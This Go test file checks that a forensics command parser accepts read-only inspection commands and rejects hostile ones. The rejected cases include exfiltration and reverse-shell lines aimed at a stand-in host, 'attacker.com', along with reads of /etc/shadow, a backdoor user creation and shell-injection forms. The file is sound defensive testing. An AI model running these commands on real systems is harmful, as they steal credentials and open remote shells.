package forensics

import "testing"

// TestParseForensicArgv_Allowed 常用只读取证命令必须可执行。
func TestParseForensicArgv_Allowed(t *testing.T) {
	allowed := []string{
		"ps aux",
		"ps -ef",
		"ss -tulnp",
		"netstat -anp",
		"lsof -i -n -P",
		"lsof -p 1234",
		"ls -la /tmp",
		"stat /etc/passwd",
		"cat /etc/crontab",
		"head -n 100 /var/log/secure",
		"tail -n 50 /var/log/messages",
		"sha256sum /usr/bin/sshd",
		"id root",
		"last -n 20",
		"uname -a",
		"df -h",
		"mount",
		"dmesg -T",
		"ip addr",
		"ip -br link",
		"getent passwd root",
		"crontab -l -u root",
		"systemctl status sshd --no-pager",
		"systemctl list-units --all",
		"journalctl -u sshd -n 200 --no-pager",
		"rpm -qf /usr/bin/sshd",
		"rpm -Va",
		"dpkg -S /usr/bin/ssh",
		"readlink -f /proc/1234/exe",
		"file /tmp/suspicious",
	}
	for _, cmd := range allowed {
		if _, err := ParseForensicArgv(cmd); err != nil {
			t.Errorf("ParseForensicArgv(%q) 应放行，实际: %v", cmd, err)
		}
	}
}

// TestParseForensicArgv_Rejected 旧的正则黑名单只列举了 rm -rf / dd / mkfs 等有限形态，
// 其余一切经 sh -c 放行。以下用例大多能穿过旧黑名单，现在必须全部被拒。
func TestParseForensicArgv_Rejected(t *testing.T) {
	rejected := []string{
		// 结构性 shell 语法——旧实现走 sh -c 时这些全部可用
		"cat /etc/passwd | nc attacker.com 4444",
		"ls; curl attacker.com/x.sh > /tmp/x",
		"ps aux && wget http://attacker.com/rootkit",
		"echo $(cat /etc/shadow)",
		"cat /etc/passwd\ncurl attacker.com",
		"ls `whoami`",
		"cat /etc/passwd > /tmp/leak",
		// 不在白名单内的程序（含旧黑名单未覆盖的）
		"bash -i",
		"sh -c id",
		"python3 -c 'import os;os.system(\"id\")'",
		"perl -e 'exec(\"/bin/sh\")'",
		"curl http://attacker.com/x.sh",
		"wget http://attacker.com/x",
		"nc -e /bin/sh attacker.com 4444",
		"chmod 777 /etc/shadow",
		"useradd backdoor",
		"systemd-run /bin/sh",
		// find 的 -exec/-delete 无法靠参数约束保证只读，整体不在白名单
		"find / -name x -exec rm {} ;",
		// 白名单程序 + 越权子命令/选项
		"systemctl restart sshd",
		"systemctl stop firewalld",
		"ip link set eth0 down",
		"crontab -r",
		"dpkg -i /tmp/evil.deb",
		"rpm -i /tmp/evil.rpm",
		"journalctl --vacuum-time=1s",
		"dmesg --clear",
	}
	for _, cmd := range rejected {
		if _, err := ParseForensicArgv(cmd); err == nil {
			t.Errorf("ParseForensicArgv(%q) 应拒绝，实际放行", cmd)
		}
	}
}

// TestParseForensicArgv_ReturnsArgv 返回 argv 供 exec.Command 直接使用，即不再经 shell。
func TestParseForensicArgv_ReturnsArgv(t *testing.T) {
	argv, err := ParseForensicArgv("journalctl -u sshd -n 200 --no-pager")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	want := []string{"journalctl", "-u", "sshd", "-n", "200", "--no-pager"}
	if len(argv) != len(want) {
		t.Fatalf("argv = %v, want %v", argv, want)
	}
	for i := range want {
		if argv[i] != want[i] {
			t.Fatalf("argv = %v, want %v", argv, want)
		}
	}
}

// TestParseForensicArgv_ValueFlagNeedsValue 带值选项缺值应拒绝，避免把下一个
// 参数意外当作操作数放行。
func TestParseForensicArgv_ValueFlagNeedsValue(t *testing.T) {
	if _, err := ParseForensicArgv("journalctl -u"); err == nil {
		t.Error("缺少取值的 -u 应被拒绝")
	}
}
